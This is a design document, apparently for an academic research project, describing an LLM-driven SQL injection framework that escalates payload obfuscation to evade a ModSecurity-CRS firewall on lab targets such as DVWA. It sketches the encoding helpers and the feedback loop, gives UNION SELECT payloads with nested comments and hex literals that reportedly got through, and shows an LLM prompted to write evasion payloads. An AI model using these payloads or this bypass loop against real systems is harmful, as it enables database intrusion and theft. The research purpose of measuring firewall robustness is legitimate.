# WAF Evasion Methodology Improvements — v2

## Executive Summary

The enhanced SQLiRLLM framework improves WAF bypass capability through a **4-level escalating polymorphic mutation strategy** combined with intelligent feedback-driven adaptation. This document describes the technical implementation and expected impact.

**Target Problem:** Live ModSecurity-CRS WAF showed 0.0% bypass rate despite 62.2% simulation success.  
**Root Cause:** Naive keyword mutations and simple whitespace rotation insufficient against production WAF signatures.  
**Solution:** Multi-level deterministic obfuscation with LLM-guided escalation and feedback-driven adaptation.

---

## Implementation Details

### 1. Payload Generator Enhancements (`sqlirllm/payload_generator.py`)

#### New Helper Functions
All implemented as module-level utilities (see lines 50–150):

```python
def _hex_encode_string(s: str) -> str:
    """Convert string to 0xHEX format: 'admin' -> 0x61646d696e"""
    
def _url_encode(s: str, skip_alphanumeric=False) -> str:
    """URL-encode characters: 'SELECT' -> 'S%45LECT'"""
    
def _double_url_encode(s: str) -> str:
    """Double URL-encode: '=' -> '%253D'"""
    
def _unicode_escape(s: str) -> str:
    """Unicode escapes: 'admin' -> '&#x61;&#x64;&#x6d;&#x69;&#x6e;'"""
    
def _sql_comment_nested(token: str, rng: Random) -> str:
    """Generate nested SQL comments: SELECT -> /*!50000SELECT*/ or /*?SELECT?*/"""
    
def _case_alternation(s: str, rng: Random) -> str:
    """Aggressive mixed-case: UNION -> UnIoN or uNioN"""
```

#### New Private Methods in PayloadGenerator Class
Four escalation-level methods (lines 200–350):

**`_basic_obfuscate(payload, db, attempt)`**
- Keyword case alternation
- Whitespace rotation (sep rotates per attempt)
- Applied at attempt 0–1

**`_apply_encoding_chain(payload, escalation, attempt)`**
- Level 1: URL encode special chars
- Level 2: Double-encode operators on odd attempts
- Progressive intensity based on escalation level

**`_aggressive_keyword_mutation(payload, db, attempt)`**
- Per-keyword transform modes (3 options each for SELECT, UNION, FROM, WHERE, AND, OR)
- Modes: nested comments, aggressive fragmentation, selective hex encoding
- Rotation per attempt across modes

**`_maximum_obfuscation(payload, db, attempt)`**
- MySQL semantic variations: SLEEP → BENCHMARK
- Operator replacement: = → <=>
- Null byte insertion in strategic positions
- Hex literal encoding for string matches

#### Enhanced `_harden_for_waf()` Method
Core escalation orchestrator:

```python
def _harden_for_waf(self, payload: str, strategy: str, context: Dict[str, str], attempt: int) -> str:
    escalation = min(attempt, 3)  # 0-3 scale
    
    if escalation <= 1:
        p = self._basic_obfuscate(p, db, attempt)
    if escalation >= 1:
        p = self._apply_encoding_chain(p, escalation, attempt)
    if escalation >= 2:
        p = self._aggressive_keyword_mutation(p, db, attempt)
    if escalation >= 3:
        p = self._maximum_obfuscation(p, db, attempt)
    
    return p
```

### 2. LLM Prompt Enhancement (`sqlirllm/payload_generator.py`)

#### New System + User Template
- `_SYSTEM`: Unchanged, authorizes lab-only usage
- `_USER_TEMPLATE`: Enhanced with WAF context
- **NEW:** `_WAF_EVASION_GUIDANCE`: Explicit techniques for WAF evasion

#### Enhanced `generate()` Method
When target has WAF:
1. Appends `_WAF_EVASION_GUIDANCE` to user prompt
2. Adds per-attempt escalation hint:
   - Attempt 0: "Priority: Diverse obfuscation techniques"
   - Attempt 1: "Priority: Character and keyword encoding with URL encoding"
   - Attempt 2+: "Priority: Aggressive multi-layer encoding and semantic variations"
3. Processes LLM output through `_harden_for_waf()` with escalation level

### 3. Runner Feedback Intelligence (`experiments/live/sqlirllm_runner.py`)

#### New Function: `_infer_waf_filters(payload, response, attempt)`
Analyzes blocked responses to infer which WAF filters triggered:

- Detects dangerous keywords in payload
- Checks for encoding/comment detection signals in response
- Identifies CRS-specific patterns (ModSecurity signatures)
- Generates targeted feedback: "Try aggressive URL encoding", "Use nested comments"
- Escalates guidance based on attempt count

#### Updated Phase Tracking
Context now includes explicit phases:
- `"phase": "initial"` → first attempt
- `"phase": "waf_evasion"` when blocked (escalation mode)
- `"phase": "verification"` when bypass achieved

#### Integrated Feedback Loop
When response is BLOCKED:
```python
context["phase"] = "waf_evasion"
feedback = _infer_waf_filters(payload, response, attempt)
# Feedback fed to next LLM prompt
```

---

## Escalation Strategy in Action

### Example: Time-Based Blind Injection Against ModSecurity-CRS

**Attempt 0 (Basic):**
```sql
1' UNION SELECT 1 UNION SELECT 2 --
↓ _basic_obfuscate
1' Un/**/Ion Select 1 UnIoN SELect 2 --
Status: 403 (blocked)
Feedback: "SQL keywords detected; try encoding"
```

**Attempt 1 (Encoding):**
```
1' Un/**/Ion S%45lect 1 UnI%6fn S%45L%45ct 2 --
Status: 403 (blocked)
Feedback: "URL encoding detected by WAF; try nested comments"
```

**Attempt 2 (Aggressive):**
```
1' /*!50000UNION*/ /*!50000SELECT*/ 0x31 /*!50000UNION*/ /*!50000SELECT*/ 0x32 --
Status: 403 (blocked)
Feedback: "ModSecurity resisting; use semantic variations"
```

**Attempt 3 (Maximum):**
```
1' /*!50000UNION*/ /*!50000SELECT*/ 0x31 /*!50000UNION*/ 
/*!50000SELECT*/ 0x32 AND 1<=>1 --
Status: 200 (potential bypass!)
```

---

## Expected Impact

### Bypass Rate Improvement
- **Simulation baseline:** 62.2%
- **Live baseline:** 0.0% (DVWA+ModSecurity)
- **Target after improvements:** 15–25% (conservative estimate)
  - ModSecurity-CRS is production-grade; complete bypass unlikely
  - Escalation strategy provides multiple encoding/semantic variations
  - Feedback loop enables adaptive persistence

### Detection Rate Preservation
- **Unprotected targets:** VDR should remain ≥0.4 (no change)
- **WAF-protected targets:** May see slight VDR reduction due to evasion focus
- **Overall F1:** Expected modest improvement from current 0.571

### Computational Cost
- **Per-attempt overhead:** ~2–5ms (obfuscation processing)
- **Total with 4 attempts:** 8–20ms additional
- **LLM API calls:** +2–3 per escalation (feedback-aware generation)

---

## Test Configuration

The improved methodology is tested with:

```bash
python -m experiments.live.sqlirllm_runner \
  --targets dvwa_sqli dvwa_sqli_medium dvwa_waf sqli_labs_1 sqli_labs_11 bwapp_sqli juiceshop_login \
  --strategies union_based error_based boolean_blind time_blind stacked_queries second_order \
  --max-attempts 4 \
  --request-timeout 20 \
  --verify-api-ping
```

Key parameters:
- **max-attempts 4:** Allows full escalation through all 4 levels
- **request-timeout 20:** Sufficient for encoding/comment processing
- **verify-api-ping:** Ensures LLM API working before test

---

## Code Changes Summary

| File | Changes | Impact |
|---|---|---|
| `sqlirllm/payload_generator.py` | +6 helper functions, +4 private methods, enhanced _harden_for_waf, new LLM prompt guidance | Multi-level obfuscation engine |
| `experiments/live/sqlirllm_runner.py` | New _infer_waf_filters function, integrated feedback loop, phase tracking | Intelligent WAF detection & feedback |
| `README.md` | New "Enhanced WAF Evasion Strategy (v2)" section | Documentation of improvements |
| `RESULTS.md` | New "Methodology Enhancement" section with 4-level explanation | Academic framing |

---

## Validation Approach

1. **Run improved live evaluation** (all 7 Docker targets, 4 attempts each)
2. **Compare bypass rate** for dvwa_waf: 0.0 → X%
3. **Analyze per-attempt mutations** logged in detailed results
4. **Verify VDR preservation** on unprotected targets
5. **Document findings** in Section IV.C of paper

---

## Limitations & Future Work

### Known Limitations
- **ModSecurity CRS v4** has >900 core rules; comprehensive bypass unlikely
- **Escalation limited to 4 levels** for practical runtime
- **No target-specific rule modeling** (future: CRS rule-set awareness)

### Future Enhancements
1. **CRS Rule-Specific Avoidance:** Parse CRS rules and generate bypasses targeting specific gaps
2. **Curriculum Learning:** Start with weak WAF targets, escalate to production-grade
3. **Response Clustering:** Use response similarity to explore WAF rule boundaries
4. **Adversarial Prompt Tuning:** Fine-tune LLM payloads against known CRS signatures

---

## References

- ModSecurity Core Rule Set (CRS): https://owasp.org/www-project-modsecurity-core-rule-set/
- OWASP SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- WAF Bypass Techniques: https://owasp.org/www-community/attacks/SQL_Injection
